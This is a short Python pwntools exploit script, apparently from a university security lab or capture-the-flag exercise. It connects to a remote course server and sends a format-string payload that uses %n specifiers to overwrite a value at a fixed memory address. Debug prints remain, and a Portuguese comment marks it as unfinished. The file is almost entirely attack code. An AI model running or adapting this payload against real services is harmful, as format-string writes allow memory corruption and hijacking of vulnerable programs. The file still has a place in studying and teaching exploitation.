from pwn import *

# P = process("./bin")
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10055)

targetAddr = 0x804a044
valueTarget = 0x0f5f1aa9
newXvalue = 0x1aa9 - 0xa9 + 120
print(newXvalue)
newXvalue = 0x10f5f - 0x804a + 25938
print(hex(newXvalue))
print(newXvalue)
P.send(p32(targetAddr) + b"%08x." * 5 + b"%6776x%n" + b"ZZZ" + p32(targetAddr + 2) + b"%08x." * 8 + b"%62567hx%n")
print(P.recvall())#FALTA ACABAR AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA